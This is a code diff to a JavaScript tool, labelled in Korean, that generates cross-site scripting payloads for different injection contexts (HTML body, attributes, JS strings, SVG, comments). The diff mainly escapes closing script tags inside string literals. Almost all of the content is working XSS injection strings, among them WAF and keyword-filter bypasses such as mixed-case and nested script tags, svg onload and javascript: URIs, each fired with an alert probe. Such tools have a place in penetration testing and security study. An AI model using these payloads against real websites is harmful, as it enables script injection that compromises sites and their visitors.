@@ -339,7 +339,7 @@ const S = {
 const CHARS = ['<', '>', '"', "'", '`', '/', '\\', ';', '(', ')', '{', '}', '=', '&', '#'];
 
 const EXTRAS = [
-  { key: 'scriptTag', label: '<script> 태그', probe: '<script>alert(1)</script>' },
+  { key: 'scriptTag', label: '<script> 태그', probe: '<script>alert(1)<\/script>' },
   { key: 'onEvent',   label: 'on* 이벤트',    probe: '<img onerror=alert(1)>' },
   { key: 'alertKw',   label: 'alert 키워드',   probe: 'alert(1)' },
   { key: 'jsURI',     label: 'javascript: URI', probe: 'javascript:alert(1)' },
@@ -515,7 +515,7 @@ function buildPayloads() {
 
   if (ctx === 'html_body') {
     if (angleOk()) {
-      if (eOk('scriptTag')) pl.push({ id: 'hb1', tier: 1, label: 'Script 태그 직접 삽입', p: '<script>alert(document.domain)</script>', desc: '가장 기본적인 XSS. script 태그가 필터링되지 않을 때.', fail: '차단 시 → img onerror, svg onload 시도' });
+      if (eOk('scriptTag')) pl.push({ id: 'hb1', tier: 1, label: 'Script 태그 직접 삽입', p: '<script>alert(document.domain)<\/script>', desc: '가장 기본적인 XSS. script 태그가 필터링되지 않을 때.', fail: '차단 시 → img onerror, svg onload 시도' });
       if (eOk('onEvent')) {
         pl.push({ id: 'hb2', tier: 1, label: 'img onerror 이벤트', p: '<img src=x onerror=alert(document.domain)>', desc: '존재하지 않는 이미지 로드 에러를 이용한 이벤트 핸들러.', fail: '차단 시 → svg onload, details ontoggle' });
         if (eOk('svgTag')) pl.push({ id: 'hb3', tier: 1, label: 'SVG onload', p: '<svg onload=alert(document.domain)>', desc: 'SVG 태그 onload 이벤트. 많은 WAF에서 허용됨.', fail: '차단 시 → animateTransform onbegin' });
@@ -531,8 +531,8 @@ function buildPayloads() {
         pl.push({ id: 'hb9', tier: 2, label: 'iframe src javascript:', p: '<iframe src="javascript:alert(1)"></iframe>', desc: '이벤트 없이 src 속성으로 실행.', fail: '' });
         pl.push({ id: 'hb10', tier: 3, label: 'button formaction', p: '<form><button formaction="javascript:alert(1)">X</button></form>', desc: 'formaction으로 JS 실행 (클릭 필요).', fail: '' });
       }
-      pl.push({ id: 'hb11', tier: 3, label: '대소문자 변형 (단순 키워드 필터 우회)', p: '<ScRiPt>alert(document.domain)</sCrIpT>', desc: '대소문자 혼용. 단순 문자열 매칭 WAF 우회.', fail: '' });
-      pl.push({ id: 'hb12', tier: 3, label: '중첩 태그 (재조합 우회)', p: '<scr<script>ipt>alert(1)</scr</script>ipt>', desc: '필터가 <script> 제거 시 나머지가 조합되어 실행.', fail: '' });
+      pl.push({ id: 'hb11', tier: 3, label: '대소문자 변형 (단순 키워드 필터 우회)', p: '<ScRiPt>alert(document.domain)<\/sCrIpT>', desc: '대소문자 혼용. 단순 문자열 매칭 WAF 우회.', fail: '' });
+      pl.push({ id: 'hb12', tier: 3, label: '중첩 태그 (재조합 우회)', p: '<scr<script>ipt>alert(1)</scr<\/script>ipt>', desc: '필터가 <script> 제거 시 나머지가 조합되어 실행.', fail: '' });
       pl.push({ id: 'hb13', tier: 3, label: 'video source onerror', p: '<video><source onerror="alert(1)"></video>', desc: '드물게 허용되는 이벤트. 태그 필터 우회.', fail: '' });
     } else {
       pl.push({ id: 'hb_ng', tier: 3, label: '⚠️ 꺾쇠 차단 — DOM XSS 또는 다른 포인트 확인 필요', p: '<!-- 꺾쇠(<>)가 차단되어 태그 삽입 불가 -->', desc: 'DOM 컨텍스트나 JS 문자열 컨텍스트를 확인하거나, 다른 입력 포인트를 탐색하세요.', fail: '' });
@@ -557,7 +557,7 @@ function buildPayloads() {
     pl.push({ id: 'asq3', tier: 2, label: '따옴표 없이 이벤트 삽입', p: ' onmouseover=alert(1) x=', desc: '공백으로 새 속성을 추가.', fail: '' });
   } else if (ctx === 'html_attr_nq') {
     pl.push({ id: 'anq1', tier: 1, label: '공백으로 새 속성 추가', p: ' onmouseover=alert(1) ', desc: '따옴표 없는 속성에 공백으로 이벤트 핸들러 추가.', fail: '' });
-    if (angleOk()) pl.push({ id: 'anq2', tier: 1, label: '태그 닫기 + 스크립트', p: '><script>alert(1)</script><x ', desc: '>로 태그를 닫고 script 삽입.', fail: '' });
+    if (angleOk()) pl.push({ id: 'anq2', tier: 1, label: '태그 닫기 + 스크립트', p: '><script>alert(1)<\/script><x ', desc: '>로 태그를 닫고 script 삽입.', fail: '' });
   } else if (ctx === 'js_sq') {
     if (!cBad("'")) {
       pl.push({ id: 'jssq1', tier: 1, label: "작은따옴표 탈출 (산술)", p: "'-alert(document.domain)-'", desc: "산술 연산자로 탈출해 alert 실행.", fail: '' });
@@ -587,11 +587,11 @@ function buildPayloads() {
     }
   } else if (ctx === 'svg_body') {
     pl.push({ id: 'svg1', tier: 1, label: 'SVG onload', p: '<svg onload=alert(1)>', desc: 'SVG 컨텍스트에서 직접 태그 삽입.', fail: '' });
-    pl.push({ id: 'svg2', tier: 1, label: 'SVG script 태그', p: '<script>alert(1)</script>', desc: 'SVG 컨텍스트에서 script 태그 허용 여부 확인.', fail: '' });
+    pl.push({ id: 'svg2', tier: 1, label: 'SVG script 태그', p: '<script>alert(1)<\/script>', desc: 'SVG 컨텍스트에서 script 태그 허용 여부 확인.', fail: '' });
     pl.push({ id: 'svg3', tier: 2, label: 'animateTransform onbegin', p: '<animateTransform onbegin=alert(1) attributeName=transform>', desc: 'SVG 애니메이션 시작 이벤트.', fail: '' });
     pl.push({ id: 'svg4', tier: 2, label: 'set onbegin', p: '<set onbegin=alert(1) attributeName=x from=0 to=1>', desc: 'set 요소의 onbegin 이벤트.', fail: '' });
   } else if (ctx === 'comment') {
-    pl.push({ id: 'cmt1', tier: 1, label: '주석 종료 후 태그 삽입', p: '--><script>alert(1)</script>', desc: '-->로 주석을 닫고 스크립트 삽입.', fail: '' });
+    pl.push({ id: 'cmt1', tier: 1, label: '주석 종료 후 태그 삽입', p: '--><script>alert(1)<\/script>', desc: '-->로 주석을 닫고 스크립트 삽입.', fail: '' });
     if (angleOk()) pl.push({ id: 'cmt2', tier: 1, label: '주석 종료 후 img onerror', p: '--><img src=x onerror=alert(1)>', desc: '주석 탈출 후 이벤트 핸들러.', fail: '' });
   }
 
